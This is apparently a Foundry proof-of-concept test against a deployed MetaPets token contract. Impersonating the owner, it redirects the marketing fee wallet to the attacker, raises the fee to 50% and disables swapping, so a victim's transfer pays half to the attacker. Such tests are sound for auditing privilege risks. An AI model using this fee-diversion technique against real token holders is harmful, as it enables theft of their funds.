// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMetaPets {
    function owner() external view returns (address);
    function setMarketingWallet(address _add) external;
    function setMarketingFeePercent(uint256 marketingFee) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function changeNumTokensSellToAddToLiquidity(uint256 _numTokensSellToAddToLiquidity) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    IMetaPets private token;
    address private owner;
    address private victim;
    address private dummy;
    address constant TARGET = 0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IMetaPets(TARGET);
        owner = token.owner();

        // Create a victim and a dummy recipient
        victim = makeAddr("victim");
        dummy = makeAddr("dummy");

        vm.label(owner, "Original Owner");
        vm.label(victim, "Victim");
        vm.label(dummy, "Dummy Recipient");

        // Give the victim some tokens to transfer from the owner
        uint256 victimInitialBalance = 1_000_000 * 1e9;
        vm.prank(owner);
        token.transfer(victim, victimInitialBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialAttackerBalance = token.balanceOf(attacker);
        assertEq(initialAttackerBalance, 0, "Attacker should start with 0 tokens");

        vm.startPrank(owner);
        // 1. Set the marketing wallet to the attacker's address
        token.setMarketingWallet(attacker);

        // 2. Set a high marketing fee
        token.setMarketingFeePercent(50); // 50% fee

        // 3. Prevent swapAndLiquify by setting the trigger threshold impossibly high
        uint256 contractTokenBalance = token.balanceOf(address(token));
        token.changeNumTokensSellToAddToLiquidity(contractTokenBalance + 1);
        vm.stopPrank();

        // 4. A victim makes a transfer, which triggers the marketing fee.
        uint256 transferAmount = 100_000 * 1e9;
        vm.prank(victim);
        token.transfer(dummy, transferAmount);

        // 5. Verify the attacker received the fees.
        uint256 expectedProfit = transferAmount * 50 / 100;
        uint256 finalAttackerBalance = token.balanceOf(attacker);

        assertEq(finalAttackerBalance, expectedProfit, "Attacker did not receive the expected fee amount");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
